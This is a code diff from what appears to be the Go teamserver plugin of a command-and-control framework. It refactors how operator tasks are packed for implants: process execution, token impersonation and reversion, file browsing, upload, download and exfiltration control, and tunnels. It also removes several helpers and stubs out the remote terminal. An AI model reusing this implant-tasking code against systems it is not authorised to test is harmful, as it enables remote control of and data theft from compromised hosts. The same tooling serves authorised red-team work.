@@ -42,7 +42,7 @@ var (
 	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
 )
 
-func AgentGenerateProfile(agentConfig string, operatingSystem string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
+func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
 	var (
 		generateConfig GenerateConfig
 		err            error
@@ -195,7 +195,7 @@ func AgentGenerateProfile(agentConfig string, operatingSystem string, listenerWM
 	return []byte(profileString), nil
 }
 
-func AgentGenerateBuild(agentConfig string, operatingSystem string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {
+func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {
 	var (
 		generateConfig GenerateConfig
 		ConnectorFile  string
@@ -471,12 +471,18 @@ func CreateTaskCommandSaveMemory(ts Teamserver, agentId string, buffer []byte) i
 	return memoryId
 }
 
-func CreateTask(ts Teamserver, agent adaptix.AgentData, command string, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
+func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
 	var (
 		taskData    adaptix.TaskData
 		messageData adaptix.ConsoleMessageData
 		err         error
 	)
+
+	command, ok := args["command"].(string)
+	if !ok {
+		return taskData, messageData, errors.New("'command' must be set")
+	}
+	subcommand, _ := args["subcommand"].(string)
 
 	taskData = adaptix.TaskData{
 		Type: TYPE_TASK,
@@ -488,8 +494,6 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, command string, args map
 		Text:   "",
 	}
 	messageData.Message, _ = args["message"].(string)
-
-	subcommand, _ := args["subcommand"].(string)
 
 	/// START CODE HERE
 
@@ -816,14 +820,7 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, command string, args map
 				programArgs = ConvertUTF8toCp(programArgs, agent.ACP)
 			}
 
-			program, ok := args["program"].(string)
-			if !ok {
-				err = errors.New("parameter 'program' must be set")
-				goto RET
-			}
-			program = ConvertUTF8toCp(program, agent.ACP)
-
-			array = []interface{}{COMMAND_PS_RUN, output, programState, program, programArgs}
+			array = []interface{}{COMMAND_PS_RUN, output, programState, programArgs}
 
 		} else {
 			err = errors.New("subcommand must be 'list', 'kill' or 'run'")
@@ -1095,7 +1092,6 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 
 	size := packer.ParseInt32()
 	if size-4 != packer.Size() {
-		//fmt.Println("Invalid tasks data")
 		return outTasks
 	}
 
@@ -1335,16 +1331,14 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 			task.Completed = false
 
 		case COMMAND_GETUID:
-			if false == packer.CheckPacker([]string{"byte", "byte", "array", "array"}) {
+			if false == packer.CheckPacker([]string{"byte", "array", "array"}) {
 				return outTasks
 			}
 
-			gui := packer.ParseInt8()
 			high := packer.ParseInt8()
 			domain := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
 			username := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
 			message := ""
-			elevated := false
 
 			if username != "" {
 				if domain != "" {
@@ -1353,14 +1347,9 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 				message = fmt.Sprintf("You are '%v'", username)
 				if high > 0 {
 					message += " (elevated)"
-					elevated = true
 				}
 			}
 			task.Message = message
-
-			if gui > 0 {
-				_ = ts.TsAgentImpersonate(agentData.Id, username, elevated)
-			}
 
 		case COMMAND_JOB:
 			if false == packer.CheckPacker([]string{"byte"}) {
@@ -1778,15 +1767,8 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 			task.ClearText = path
 
 		case COMMAND_REV2SELF:
-			if false == packer.CheckPacker([]string{"byte"}) {
-				return outTasks
-			}
-
-			gui := packer.ParseInt8()
-			if gui == 1 {
-				task.Message = "Token reverted successfully"
-			}
-			_ = ts.TsAgentImpersonate(agentData.Id, "", agentData.Elevated)
+			task.Message = "Token reverted successfully"
+			_ = ts.TsAgentSetImpersonate(agentData.Id, "", false)
 
 		case COMMAND_RM:
 			if false == packer.CheckPacker([]string{"byte"}) {
@@ -1915,85 +1897,6 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 	return outTasks
 }
 
-/// BROWSERS
-
-func BrowserDisks(agentData adaptix.AgentData) ([]byte, error) {
-	array := []interface{}{COMMAND_DISKS}
-	return PackArray(array)
-}
-
-func BrowserProcess(agentData adaptix.AgentData) ([]byte, error) {
-	array := []interface{}{COMMAND_PS_LIST}
-	return PackArray(array)
-}
-
-func BrowserFiles(path string, agentData adaptix.AgentData) ([]byte, error) {
-	dir := ConvertUTF8toCp(path, agentData.ACP)
-	array := []interface{}{COMMAND_LS, dir}
-	return PackArray(array)
-}
-
-func BrowserUpload(ts Teamserver, path string, content []byte, agentData adaptix.AgentData) ([]byte, error) {
-	memoryId := CreateTaskCommandSaveMemory(ts, agentData.Id, content)
-	fileName := ConvertUTF8toCp(path, agentData.ACP)
-	array := []interface{}{COMMAND_UPLOAD, memoryId, fileName}
-	return PackArray(array)
-}
-
-/// DOWNLOADS
-
-func TaskDownloadStart(path string, agentData adaptix.AgentData) ([]byte, error) {
-	array := []interface{}{COMMAND_DOWNLOAD, ConvertUTF8toCp(path, agentData.ACP)}
-	return PackArray(array)
-}
-
-func TaskDownloadCancel(fid string) ([]byte, error) {
-	fileId, err := strconv.ParseInt(fid, 16, 64)
-	if err != nil {
-		return nil, err
-	}
-
-	array := []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_CANCELED, int(fileId)}
-	return PackArray(array)
-}
-
-func TaskDownloadResume(fid string) ([]byte, error) {
-	fileId, err := strconv.ParseInt(fid, 16, 64)
-	if err != nil {
-		return nil, err
-	}
-
-	array := []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_RUNNING, int(fileId)}
-	return PackArray(array)
-}
-
-func TaskDownloadPause(fid string) ([]byte, error) {
-	fileId, err := strconv.ParseInt(fid, 16, 64)
-	if err != nil {
-		return nil, err
-	}
-
-	array := []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_STOPPED, int(fileId)}
-	return PackArray(array)
-}
-
-///
-
-func BrowserJobKill(jobId string) ([]byte, error) {
-	jobIdstr, err := strconv.ParseInt(jobId, 16, 64)
-	if err != nil {
-		return nil, err
-	}
-
-	array := []interface{}{COMMAND_JOBS_KILL, int(jobIdstr)}
-	return PackArray(array)
-}
-
-func BrowserExit(agentData adaptix.AgentData) ([]byte, error) {
-	array := []interface{}{COMMAND_TERMINATE, 2}
-	return PackArray(array)
-}
-
 /// TUNNELS
 
 func TunnelCreateTCP(channelId int, address string, port int) ([]byte, error) {
@@ -2029,13 +1932,13 @@ func TunnelReverse(tunnelId int, port int) ([]byte, error) {
 /// TERMINAL
 
 func TerminalStart(terminalId int, program string, sizeH int, sizeW int) ([]byte, error) {
-	return nil, nil
+	return nil, errors.New("Function Remote Terminal not supported")
 }
 
 func TerminalWrite(terminalId int, data []byte) ([]byte, error) {
-	return nil, nil
+	return nil, errors.New("Function Remote Terminal not supported")
 }
 
 func TerminalClose(terminalId int) ([]byte, error) {
-	return nil, nil
+	return nil, errors.New("Function Remote Terminal not supported")
 }
